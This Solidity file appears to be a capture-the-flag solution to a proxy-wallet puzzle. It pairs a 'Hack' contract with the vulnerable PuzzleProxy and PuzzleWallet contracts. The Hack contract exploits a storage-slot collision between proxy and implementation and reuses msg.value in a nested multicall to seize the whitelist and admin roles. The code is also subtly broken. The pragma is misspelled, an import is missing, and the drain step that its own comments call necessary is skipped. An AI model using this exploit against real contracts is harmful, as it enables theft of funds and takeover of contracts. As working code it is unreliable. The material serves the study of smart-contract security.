// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncodeV2;   // -> Enables the use of ABI Encoder V2 -> allows encoding and decoding 

/*

Proxy contract = proxy contract(data) + Upgradable contract(logic)



->  security issue
    Storoage slot collision
        
        proxy contract   slot 0  -> store  "jatin"
                         slot 1  -> store  "akshay"

        make changes in logic contract reflect in proxy

        logic contract   slot 0  -> store  "muskan"       ---->    proxy contract   slot 0  -> changed to "muskan"
                         slot 1  -> store  "akshay"                                 slot 1  -> store      "akshay"

                    

 A -delegate call->B     so delegate call use storage of A but logic of B



*/

// Proxy(data)                 =  PuzzleProxy                
// Upgradable contract(logic)  =  Puzzle wallet  = Implementation

contract Hack
{
    constructor(PuzzleWallet adr) payable
    {
        /* to update admin  <--  you have to update maxBalance  <-- setMaxBalance( 
                                                                                1. onlyWhitelisted 
                                                                                         +
                                                                                2. require(address(this).balance == 0 )


            1. onlyWhitelisted    <-----  addToWhitelist                                   
                                       require(msg.sender == owner)         <---  you have to update pendingAdmin   <-- proposeNewAdmin  

            

            2. require(address(this).balance == 0 )     <--  execute(address(this) ,0.02 ETH ," ") 
                                                             require(balances[msg.sender] >= value                  <--- if you can hack like this 
                                                                                                                    deposit() 0.01 ETH but balances[msg.sender] show 0.02 
                                                                                                                                             ⤋
                                                                                                                            contract balance :  0.01 ETH
                                                                                                                                                 +
                                                                                                      adr.multicall{value : 0.01 ether}(data):  0.01 ETH
                                                                                                                                                 -
                                                                                                                      to.call{ value: value }:  0.02 ETH
                                                                                                                                              = 0.00 ETH
                                                                                                                                       ⤋       
                                                                                                                         address(this).balance == 0
                                                                                                                               mission complete
                                            
 
        */
 
        // 1.
        adr.proposeNewAdmin(address(this)); // ower updated
        adr.addToWhitelist(address(this));  // onlyWhitelisted modifier pass

        // 2.
        bytes[] memory deposit_1 = new bytes[](1); //length 1
        bytes[] memory data = new bytes[](2);     // length 2
        deposit_1[0] = abi.encodeWithSelector(adr.deposit.selector); // if(selector := mload(add(_data, 32) = first 32 bytes == this.deposit.selector) 

        data[0] = deposit_1[0];
        data[1] = abi.encodeWithSelector(adr.multicall.selector,deposit_1);  //calling deposite() 2 time but 0.01 ether is passes only 
        adr.multicall{value : 0.01 ether}(data);
        
        adr.setMaxBalance(uint256(uint160(address(this))));  //admin updated


    }

}












contract PuzzleProxy is UpgradeableProxy 
{
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}



contract PuzzleWallet 
{
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) 
        {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly 
            {
                selector := mload(add(_data, 32))
            }

            if (selector == this.deposit.selector) 
            {
                require(!depositCalled, "Deposit can only be called once");   // Protect against reusing msg.value
                depositCalled = true;
            }

            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}